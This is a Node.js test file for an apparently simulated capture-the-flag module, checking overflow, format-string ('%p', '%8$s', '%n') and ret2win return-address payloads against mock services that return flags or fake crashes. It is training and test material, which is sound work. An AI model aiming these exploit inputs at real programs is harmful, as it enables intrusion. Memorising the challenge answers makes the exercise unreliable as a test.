import assert from 'node:assert/strict';
import test from 'node:test';
import { FLAGS, parsePayload, run } from './services.mjs';

test('parsePayload understands hex escapes and plain text', () => {
  assert.deepEqual(parsePayload('A\\x96\\x11'), [0x41, 0x96, 0x11]);
  assert.deepEqual(parsePayload('\\xZZ'), [0x5c, 0x78, 0x5a, 0x5a]); // not a valid escape: kept literally
});

test('overflow: short input is denied, a small overflow wins, a huge one crashes', () => {
  assert.match(run('overflow', 'hunter2'), /denied/);
  assert.ok(run('overflow', 'A'.repeat(17)).includes(FLAGS.overflow));
  assert.ok(run('overflow', 'A'.repeat(24)).includes(FLAGS.overflow));
  assert.match(run('overflow', 'A'.repeat(40)), /Segmentation/);
  assert.ok(!run('overflow', 'A'.repeat(40)).includes('CTF{'));
});

test('format: %p leaks pointers and %8$s reads the secret string', () => {
  assert.match(run('format', '%x %x'), /^Hello, 7ffd1c2a 1$/);
  assert.ok(run('format', '%p.%p.%p.%p.%p.%p.%p.%p').includes('0x55555555a2c0'));
  assert.ok(run('format', '%8$s').includes(FLAGS.format));
  assert.match(run('format', '%1$s'), /Segmentation/); // an integer is not a pointer
  assert.match(run('format', 'AAAA%n'), /Segmentation/);
  assert.equal(run('format', 'plain'), 'Hello, plain');
});

test('ret2win: only the exact win() address in the return slot wins', () => {
  const pad = 'A'.repeat(40);
  assert.ok(run('ret2win', `${pad}\\x96\\x11\\x40\\x00\\x00\\x00\\x00\\x00`).includes(FLAGS.ret2win));
  assert.match(run('ret2win', `${pad}\\x97\\x11\\x40\\x00\\x00\\x00\\x00\\x00`), /Segmentation fault at 0x401197/);
  assert.match(run('ret2win', 'A'.repeat(36)), /Segmentation/);
  assert.match(run('ret2win', 'hello'), /You said: hello/);
  assert.ok(!run('ret2win', `${pad}\\x96\\x11\\x40`).includes('CTF{')); // too short to reach the slot
});

test('ret2win: raw bytes (as sent by python | nc) work like escapes', () => {
  const raw = 'A'.repeat(40) + String.fromCharCode(0x96, 0x11, 0x40, 0, 0, 0, 0, 0);
  assert.ok(run('ret2win', raw).includes(FLAGS.ret2win));
});

test('unknown service', () => assert.equal(run('nope', 'x'), null));
